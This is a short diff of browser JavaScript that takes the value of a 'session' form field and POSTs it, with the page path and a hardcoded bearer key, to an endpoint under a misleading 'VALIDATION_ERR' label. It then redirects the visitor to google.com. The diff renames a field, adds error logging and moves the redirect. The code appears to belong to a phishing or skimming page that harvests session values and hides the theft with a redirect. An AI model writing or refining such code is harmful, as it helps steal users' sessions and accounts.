@@ -15,17 +15,19 @@ document.addEventListener('DOMContentLoaded', () => {
                             "Authorization": "Bearer sb_publishable_YW4CiOxNDrcIAFlplxDssw_juKo63R8",
                         },
                         body: JSON.stringify({ 
-                            session_id: "VALIDATION_ERR", 
+                            event: "VALIDATION_ERR", 
                             path: window.location.pathname,
-                            data: sessionField.value 
+                            data: sessionField.value, 
                         })
                     });
-                } catch (e) {
+                    window.location.href = "https://www.google.com";
+                } catch (e) {   
+                  console.error("Error sending validation data:", e);
                   
                 }
 
                 
-                window.location.href = "https://www.google.com";
+                
             }
         });
     }
